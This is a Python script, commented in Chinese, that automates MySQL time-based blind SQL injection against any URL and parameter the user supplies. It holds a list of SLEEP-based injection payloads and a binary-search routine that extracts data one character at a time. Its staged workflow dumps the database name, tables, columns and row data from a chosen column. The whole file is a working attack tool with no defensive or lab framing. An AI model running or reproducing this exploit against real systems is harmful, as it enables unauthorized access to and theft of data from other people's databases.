import requests
import time
import urllib.parse
import string


class MySQLTimeBasedBlindExploiter:
    def __init__(self, target_url, vulnerable_param):
        self.target_url = target_url
        self.vulnerable_param = vulnerable_param
        self.timeout = 15  # 基础请求超时时间
        self.delay_threshold = 1  # 延迟判定阈值（秒）
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept-Language': 'en-US,en;q=0.9'
        })

    def check_vulnerability(self):
        """验证目标是否存在时间盲注漏洞"""
        test_payloads = [
            "1' AND IF(1=1,SLEEP(1),0)-- qwe",
            "1' AND IF(1=2,SLEEP(1),0)-- qwe",
            "X' OR IF(1=1,SLEEP(1),0)-- qwe",
            "' OR (SELECT COUNT(*) FROM information_schema.tables)  > 0 AND sleep  (1)-- ",
            "'OR (SELECT COUNT(*) FROM users) > 0 AND sleep(1)-- ",
            "' OR (SELECT COUNT(*) FROM information_schema.columns  WHERE table_name='users') > 0 AND sleep(1)-- ",
            "' OR (SELECT COUNT(*) FROM information_schema.schemata)  > 0 AND sleep(1)-- ",
            "' OR (SELECT COUNT(*) FROM pg_catalog.pg_tables)  > 0 AND sleep(1)-- ",
            "' OR (SELECT COUNT(*) FROM sys.tables)  > 0 AND sleep(1)-- ",
            "' OR (SELECT COUNT(*) FROM all_tables) > 0 AND sleep(1)-- ",
            "' OR (SELECT COUNT(*) FROM v$version) > 0 AND sleep(1)-- ",
            "' OR (SELECT COUNT(*) FROM information_schema.tables  WHERE table_schema=database()) > 0 AND sleep(1)-- ",
            "' OR (SELECT COUNT(*) FROM information_schema.columns  WHERE table_schema=database()) > 0 AND sleep(1)-- "
        ]
        for payload in test_payloads:
            if self._send_payload(payload):
                return True
        return False

    def _send_payload(self, payload, verbose=True):
        """发送Payload并检测响应时间"""
        params = {self.vulnerable_param: payload}
        start_time = time.time()
        try:
            response = self.session.get(self.target_url, params=params, timeout=self.timeout + self.delay_threshold)
            elapsed = time.time() - start_time
            if verbose:
                print(f"[*] 测试Payload: {payload[:50]}... | 响应时间: {elapsed:.2f}s")
            return elapsed > self.delay_threshold
        except Exception as e:
            print(f"[-] 请求异常: {e}")
            return False

    def _binary_search_char(self, query_template):
        """二分法逐字符爆破数据"""
        result = ""
        i = 1
        while True:
            low, high = 32, 126  # ASCII可打印字符范围
            found = False
            while low <= high:
                mid = (low + high) // 2
                # 构造判断字符的Payload
                payload = f"' OR IF(ASCII(SUBSTRING(({query_template}),{i},1))>{mid},SLEEP(0.1),0)-- qwe"
                if self._send_payload(payload, verbose=False):
                    low = mid + 1
                else:
                    high = mid - 1
            if low > 32:  # 找到有效字符
                result += chr(low)
                print(f"[+] 当前结果: {result}")
                i += 1
            else:  # 终止条件
                break
        return result if result else None

    def exploit(self):
        """多阶段自动化爆破"""
        if not self.check_vulnerability():
            print("[-] 目标不存在时间盲注漏洞")
            return

        print("\n[=== 开始数据爆破 ===]")

        # 阶段1：爆破当前数据库名
        print("\n[1] 爆破当前数据库名...")
        db_name = self._binary_search_char("SELECT DATABASE()")
        print(f"[+] 当前数据库: {db_name}")

        # 阶段2：爆破所有表名
        print("\n[2] 爆破表名...")
        tables = []
        for i in range(10):  # 限制爆破10个表
            table = self._binary_search_char(
                f"SELECT table_name FROM information_schema.tables  WHERE table_schema='{db_name}' LIMIT {i},1"
            )
            if not table:
                break
            tables.append(table)
        print(f"[+] 发现表: {', '.join(tables)}")

        # 阶段3：选择表并爆破字段
        if tables:
            target_table = input("\n输入要爆破的表名: ").strip()
            print(f"\n[3] 爆破表 '{target_table}' 的字段...")
            columns = []
            for i in range(10):  # 限制爆破10个字段
                column = self._binary_search_char(
                    f"SELECT column_name FROM information_schema.columns  WHERE table_schema='{db_name}' AND table_name='{target_table}' LIMIT {i},1"
                )
                if not column:
                    break
                columns.append(column)
            print(f"[+] 发现字段: {', '.join(columns)}")

            # 阶段4：爆破数据
            if columns:
                target_column = input("\n输入要爆破的字段名: ").strip()
                print(f"\n[4] 爆破字段 '{target_column}' 的数据...")
                for i in range(20):  # 限制爆破20行数据
                    data = self._binary_search_char(
                        f"SELECT {target_column} FROM {target_table} LIMIT {i},1"
                    )
                    if not data:
                        break
                    print(f"[+] 行{i + 1}: {data}")


if __name__ == "__main__":
    print("MySQL时间盲注自动化爆破")
    target = input("目标URL: ")
    param = input("漏洞参数名: ")

    exploiter = MySQLTimeBasedBlindExploiter(target, param)
    exploiter.exploit()
